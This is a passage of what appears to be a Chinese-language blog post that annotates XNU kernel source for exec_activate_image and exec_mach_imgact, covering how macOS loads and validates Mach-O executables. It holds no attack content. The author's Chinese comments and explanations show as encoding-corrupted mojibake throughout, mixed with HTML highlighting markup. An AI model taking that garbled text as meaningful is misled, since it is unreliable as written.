class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> itercount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">proc_t</span> p = vfs_context_proc(imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">	error = execargs_alloc(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	</span><br><span class="line">	error = exec_save_path(imgp, imgp-&gt;ip_user_fname, imgp-&gt;ip_seg, &amp;excpath);</span><br><span class="line">	<span class="keyword">if</span> (error) &#123;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Use excpath, which contains the copyin-ed exec path */</span></span><br><span class="line">	DTRACE_PROC1(exec, <span class="keyword">uintptr_t</span>, excpath);</span><br><span class="line"></span><br><span class="line">	MALLOC(ndp, <span class="keyword">struct</span> nameidata *, <span class="keyword">sizeof</span>(*ndp), M_TEMP, M_WAITOK | M_ZERO);</span><br><span class="line">	<span class="keyword">if</span> (ndp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		error = ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	NDINIT(ndp, LOOKUP, OP_LOOKUP, FOLLOW | LOCKLEAF | AUDITVNPATH1,</span><br><span class="line">		   UIO_SYSSPACE, CAST_USER_ADDR_T(excpath), imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line">	error = namei(ndp); <span class="comment">//<span class="doctag">todo:</span>	è¯¦ç»†æµç¨‹å…ˆä¸çœ‹ï¼Œç ”ç©¶ä¸‹æ¥æ„Ÿè§‰æ˜¯è·¯å¾„çš„æœç´¢</span></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	imgp-&gt;ip_ndp = ndp;	<span class="comment">/* successful namei(); call nameidone() later */</span></span><br><span class="line">	imgp-&gt;ip_vp = ndp-&gt;ni_vp;	<span class="comment">/* if set, need to vnode_put() at some point */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Before we start the transition from binary A to binary B, make</span><br><span class="line">	 * sure another thread hasn't started exiting the process.  We grab</span><br><span class="line">	 * the proc lock to check p_lflag initially, and the transition</span><br><span class="line">	 * mechanism ensures that the value doesn't change after we release</span><br><span class="line">	 * the lock.</span><br><span class="line">	 */</span></span><br><span class="line">	proc_lock(p);</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;p_lflag &amp; P_LEXIT) &#123;</span><br><span class="line">		proc_unlock(p);</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line">	error = proc_transstart(p, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	proc_unlock(p);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line"></span><br><span class="line">	error = exec_check_permissions(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy; avoid invocation of an interpreter overwriting the original */</span></span><br><span class="line">	<span class="keyword">if</span> (once) &#123;</span><br><span class="line">		once = <span class="number">0</span>;</span><br><span class="line">		*imgp-&gt;ip_origvattr = *imgp-&gt;ip_vattr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//è¯»å–æ•°æ®åˆ°å†…å­˜ä¸­</span></span><br><span class="line">	error = vn_rdwr(UIO_READ, imgp-&gt;ip_vp, imgp-&gt;ip_vdata, PAGE_SIZE, <span class="number">0</span>,</span><br><span class="line">			UIO_SYSSPACE, IO_NODELOCKED,</span><br><span class="line">			vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">			&amp;resid, vfs_context_proc(imgp-&gt;ip_vfs_context));</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (resid) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(imgp-&gt;ip_vdata + (PAGE_SIZE - resid), <span class="number">0x0</span>, resid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//åˆ°è¿™é‡Œä¹‹å‰çš„ä»£ç ä¸»è¦åšäº†ä¸¤ä»¶äº‹æƒ…</span></span><br><span class="line">  	<span class="comment">//1.æ ¹æ®è·¯å¾„æŸ¥æ‰¾æ–‡ä»¶</span></span><br><span class="line">  	<span class="comment">//2.å°†æ–‡ä»¶æ‹·è´åˆ°å†…å­˜ä¸­</span></span><br><span class="line">encapsulated_binary:</span><br><span class="line">	<span class="comment">/* Limit the number of iterations we will attempt on each binary */</span></span><br><span class="line">	<span class="keyword">if</span> (++itercount &gt; EAI_ITERLIMIT) &#123;</span><br><span class="line">		error = EBADEXEC;</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line">	&#125;</span><br><span class="line">	error = -<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; error == -<span class="number">1</span> &amp;&amp; execsw[i].ex_imgact != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">		<span class="comment">//è¿™é‡Œå¯¹machoæ–‡ä»¶è¿›è¡Œäº†è§£æ</span></span><br><span class="line">		error = (*execsw[i].ex_imgact)(imgp);	<span class="comment">//<span class="doctag">todo:</span>è°ƒç”¨äº†ä¸€ä¸ªæŒ‡é’ˆå‡½æ•°ï¼Œexec_mach_imgact</span></span><br><span class="line">      	<span class="comment">//æ€»å…±æœ‰ä¸‰ç§å‡½æ•°</span></span><br><span class="line">      	<span class="comment">/*</span><br><span class="line">        struct execsw &#123;</span><br><span class="line">		int (*ex_imgact)(struct image_params *);</span><br><span class="line">		const char *ex_name;</span><br><span class="line">		&#125; execsw[] = &#123;</span><br><span class="line">		&#123; exec_mach_imgact,		"Mach-o Binary" &#125;,</span><br><span class="line">		&#123; exec_fat_imgact,		"Fat Binary" &#125;,</span><br><span class="line">		&#123; exec_shell_imgact,		"Interpreter Script" &#125;,</span><br><span class="line">		&#123; NULL, NULL&#125;</span><br><span class="line">&#125;;</span><br><span class="line">*/</span></span><br><span class="line">      	<span class="comment">//åˆ†åˆ«æ˜¯osxæ”¯æŒçš„ä¸‰ç§ä¸åŒçš„å¯æ‰§è¡Œæ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (error) &#123;</span><br><span class="line">            <span class="comment">/*å‡ºé”™å¤„ç†*/</span></span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Call out to allow 3rd party notification of exec. </span><br><span class="line">	 * Ignore result of kauth_authorize_fileop call.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> &amp;&amp; kauth_authorize_fileop_has_listeners()) &#123;</span><br><span class="line">		kauth_authorize_fileop(vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">					KAUTH_FILEOP_EXEC,</span><br><span class="line">					(<span class="keyword">uintptr_t</span>)ndp-&gt;ni_vp, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">	proc_transend(p, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bad_notrans:</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_strings)</span><br><span class="line">		execargs_free(imgp);</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_ndp)</span><br><span class="line">		nameidone(imgp-&gt;ip_ndp);</span><br><span class="line">	<span class="keyword">if</span> (ndp)</span><br><span class="line">		FREE(ndp, M_TEMP);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°ä¸»è¦åšçš„äº‹æƒ…å°±æ˜¯å¯»æ‰¾å¹¶æ‹·è´<strong>å¯æ‰§è¡Œæ–‡ä»¶</strong>åˆ°å†…å­˜ä¸­ï¼Œå¹¶ä¸”æ ¹æ®å¯æ‰§è¡Œæ–‡ä»¶çš„ç±»å‹è°ƒç”¨ä¸åŒçš„è§£æå‡½æ•°ã€‚osxæ€»å…±æ”¯æŒä¸‰ç§å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä»–ä»¬å„è‡ªæœ‰å¯¹åº”çš„å¤„ç†å‡½æ•°ã€‚</p>
<ul>
<li><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o</a>ï¼šexec_mach_imgact</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E4%BA%8C%E8%BF%9B%E5%88%B6" target="_blank" rel="external">Fat Binary</a>ï¼šexec_fat_imgact</li>
<li>Interpreter Scriptï¼šexec_shell_imgact</li>
</ul>
<h2 id="1-3_exec_mach_imgact">1.3 exec_mach_imgact</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * exec_mach_imgact</span><br><span class="line"> *</span><br><span class="line"> * Image activator for mach-o 1.0 binaries.</span><br><span class="line"> *</span><br><span class="line"> * Parameters;	struct image_params *	image parameter block</span><br><span class="line"> *</span><br><span class="line"> * Returns:	-1			not a fat binary (keep looking)</span><br><span class="line"> *		-2			Success: encapsulated binary: reread</span><br><span class="line"> *		&gt;0			Failure: error number</span><br><span class="line"> *		EBADARCH		Mach-o binary, but with an unrecognized</span><br><span class="line"> *					architecture</span><br><span class="line"> *		ENOMEM			No memory for child process after -</span><br><span class="line"> *					can only happen after vfork()</span><br><span class="line"> *</span><br><span class="line"> * Important:	This image activator is NOT byte order neutral.</span><br><span class="line"> *</span><br><span class="line"> * Note:	A return value other than -1 indicates subsequent image</span><br><span class="line"> *		activators should not be given the opportunity to attempt</span><br><span class="line"> *		to activate the image.</span><br><span class="line"> *</span><br><span class="line"> * TODO:	More gracefully handle failures after vfork</span><br><span class="line"> */</span><br><span class="line">static int</span><br><span class="line">exec_mach_imgact(struct image_params *imgp)</span><br><span class="line">&#123;</span><br><span class="line">	struct mach_header *mach_header = (struct mach_header *)imgp-&gt;ip_vdata;</span><br><span class="line">	proc_t			p = vfs_context_proc(imgp-&gt;ip_vfs_context);</span><br><span class="line">	int			error = 0;</span><br><span class="line">	task_t			task;</span><br><span class="line">	task_t			new_task = NULL; /* protected by vfexec */</span><br><span class="line">	thread_t		thread;</span><br><span class="line">	struct uthread		*uthread;</span><br><span class="line">	vm_map_t old_map = VM_MAP_NULL;</span><br><span class="line">	vm_map_t map;</span><br><span class="line">	load_return_t		lret;</span><br><span class="line">	load_result_t		load_result;</span><br><span class="line">	struct _posix_spawnattr *psa = NULL;</span><br><span class="line">	int			spawn = (imgp-&gt;ip_flags &amp; IMGPF_SPAWN);</span><br><span class="line">	int			vfexec = (imgp-&gt;ip_flags &amp; IMGPF_VFORK_EXEC);</span><br><span class="line">	int			p_name_len;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * make sure it's a Mach-O 1.0 or Mach-O 2.0 binary; the difference</span><br><span class="line">	 * is a reserved field on the end, so for the most part, we can</span><br><span class="line">	 * treat them as if they were identical. Reverse-endian Mach-O</span><br><span class="line">	 * binaries are recognized but not compatible.</span><br><span class="line"> 	 */</span><br><span class="line">    // æ£€æµ‹headeré‡Œé¢çš„magicï¼Œæ˜¯å¦ç¬¦åˆmachoæ–‡ä»¶çš„ç‰¹å¾</span><br><span class="line">  	// NXSwapInt:PowerPCç­‰å¹³å°ä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶</span><br><span class="line">  	//MH_CIGAM    = 0xCEFAEDFE</span><br><span class="line">    //MH_CIGAM_64 = 0xCFFAEDFE</span><br><span class="line">	if ((mach_header-&gt;magic == MH_CIGAM) ||</span><br><span class="line">	    (mach_header-&gt;magic == MH_CIGAM_64)) &#123;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	// æ£€æµ‹headeré‡Œé¢çš„magicï¼Œæ˜¯å¦ç¬¦åˆmachoæ–‡ä»¶çš„ç‰¹å¾</span><br><span class="line">    // #define	MH_MAGIC	0xfeedface</span><br><span class="line">  	// #define MH_MAGIC_64 0xfeedfacf </span><br><span class="line">    // é€šç”¨çš„machoäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸€èˆ¬é‡åˆ°éƒ½æ˜¯è¿™ç§</span><br><span class="line">	if ((mach_header-&gt;magic != MH_MAGIC) &amp;&amp;</span><br><span class="line">	    (mach_header-&gt;magic != MH_MAGIC_64)) &#123;</span><br><span class="line">		error = -1;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">  	// æ£€æµ‹machoçš„æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶ç±»å‹å¿…é¡»æ˜¯å¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">   	// è¿˜æœ‰ä¸€äº›å…¶ä»–çš„å¸¸è§ç±»å‹</span><br><span class="line">    // #define	MH_OBJECT	0x1		ç¼–è¯‘è¿‡ç¨‹äº§ç”Ÿçš„objæ–‡ä»¶</span><br><span class="line">    // #define	MH_CORE		0x4		å´©æºƒæ—¶çš„dumpæ–‡ä»¶</span><br><span class="line">	if (mach_header-&gt;filetype != MH_EXECUTE) &#123;</span><br><span class="line">		error = -1;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    // è·å–machoçš„æ‰§è¡Œç¯å¢ƒï¼Œcpuçš„å¹³å°ä¸ç‰ˆæœ¬</span><br><span class="line">	if (imgp-&gt;ip_origcputype != 0) &#123;</span><br><span class="line">		/* Fat header previously had an idea about this thin file */</span><br><span class="line">		if (imgp-&gt;ip_origcputype != mach_header-&gt;cputype ||</span><br><span class="line">			imgp-&gt;ip_origcpusubtype != mach_header-&gt;cpusubtype) &#123;</span><br><span class="line">			error = EBADARCH;</span><br><span class="line">			goto bad;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		imgp-&gt;ip_origcputype = mach_header-&gt;cputype;</span><br><span class="line">		imgp-&gt;ip_origcpusubtype = mach_header-&gt;cpusubtype;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	task = current_task();</span><br><span class="line">	thread = current_thread();</span><br><span class="line">	uthread = get_bsdthread_info(thread);</span><br><span class="line"></span><br><span class="line">	if ((mach_header-&gt;cputype &amp; CPU_ARCH_ABI64) == CPU_ARCH_ABI64)</span><br><span class="line">		imgp-&gt;ip_flags |= IMGPF_IS_64BIT;</span><br><span class="line"></span><br><span class="line">	/* If posix_spawn binprefs exist, respect those prefs. */</span><br><span class="line">	psa = (struct _posix_spawnattr *) imgp-&gt;ip_px_sa;</span><br><span class="line">	if (psa != NULL &amp;&amp; psa-&gt;psa_binprefs[0] != 0) &#123;</span><br><span class="line">		int pr = 0;</span><br><span class="line">		for (pr = 0; pr &lt; NBINPREFS; pr++) &#123;</span><br><span class="line">			cpu_type_t pref = psa-&gt;psa_binprefs[pr];</span><br><span class="line">			if (pref == 0) &#123;</span><br><span class="line">				/* No suitable arch in the pref list */</span><br><span class="line">				error = EBADARCH;</span><br><span class="line">				goto bad;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			if (pref == CPU_TYPE_ANY) &#123;</span><br><span class="line">				/* Jump to regular grading */</span><br><span class="line">				goto grade;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			if (pref == imgp-&gt;ip_origcputype) &#123;</span><br><span class="line">				/* We have a match! */</span><br><span class="line">				goto grade;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line">grade:</span><br><span class="line">  	//æ£€æµ‹cpuå¹³å°</span><br><span class="line">	if (!grade_binary(imgp-&gt;ip_origcputype, imgp-&gt;ip_origcpusubtype &amp; ~CPU_SUBTYPE_MASK)) 	  &#123;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Copy in arguments/environment from the old process */</span><br><span class="line">    //è·å–ç¯å¢ƒå˜é‡å’Œå‚æ•°</span><br><span class="line">    //ä¸ºvforkæ‰§è¡Œmachoåšå‡†å¤‡</span><br><span class="line">	error = exec_extract_strings(imgp);</span><br><span class="line">	if (error)</span><br><span class="line">		goto bad;</span><br><span class="line"></span><br><span class="line">	error = exec_add_apple_strings(imgp);</span><br><span class="line">	if (error)</span><br><span class="line">		goto bad;</span><br><span class="line"></span><br><span class="line">	AUDIT_ARG(argv, imgp-&gt;ip_startargv, imgp-&gt;ip_argc, </span><br><span class="line">	    imgp-&gt;ip_endargv - imgp-&gt;ip_startargv);</span><br><span class="line">	AUDIT_ARG(envv, imgp-&gt;ip_endargv, imgp-&gt;ip_envc,</span><br><span class="line">	    imgp-&gt;ip_endenvv - imgp-&gt;ip_endargv);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * We are being called to activate an image subsequent to a vfork()</span><br><span class="line">	 * operation; in this case, we know that our task, thread, and</span><br><span class="line">	 * uthread are actually those of our parent, and our proc, which we</span><br><span class="line">	 * obtained indirectly from the image_params vfs_context_t, is the</span><br><span class="line">	 * new child process.</span><br><span class="line">	 */</span><br><span class="line">    // é€šè¿‡forkï¼Œä¸ºmachoç”Ÿæˆä¸€ä¸ªæ–°çš„çº¿ç¨‹</span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		if (vfexec) &#123;</span><br><span class="line">			imgp-&gt;ip_new_thread = fork_create_child(task, NULL, p, FALSE, (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT));</span><br><span class="line">			if (imgp-&gt;ip_new_thread == NULL) &#123;</span><br><span class="line">				error = ENOMEM;</span><br><span class="line">				goto bad;</span><br><span class="line">			&#125;</span><br><span 